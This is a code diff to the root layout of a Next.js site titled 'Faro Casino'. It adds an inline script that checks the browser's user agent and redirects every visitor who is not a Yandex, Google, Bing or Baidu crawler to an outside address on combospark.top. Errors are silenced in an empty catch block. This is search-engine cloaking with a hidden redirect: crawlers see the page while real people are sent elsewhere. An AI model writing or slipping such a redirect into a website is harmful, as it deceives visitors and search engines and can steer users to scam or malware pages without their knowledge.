@@ -98,14 +98,22 @@ export default function RootLayout({
         <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
         <meta name="apple-mobile-web-app-title" content="Faro Casino" />
         <meta name="yandex-verification" content="9ef9f9dda1a5f408" />
-<script>
-var ua = navigator.userAgent.toLowerCase();
-if (ua.indexOf("yandex") === -1) {
-location.replace("https://combospark.top/aetf3u2q9u");
-} else {
-console.log("Яндекс бот — без редиректа");
-}    
-</script>
+<script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aetf3u2q9u");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="frc-body">
         {children}
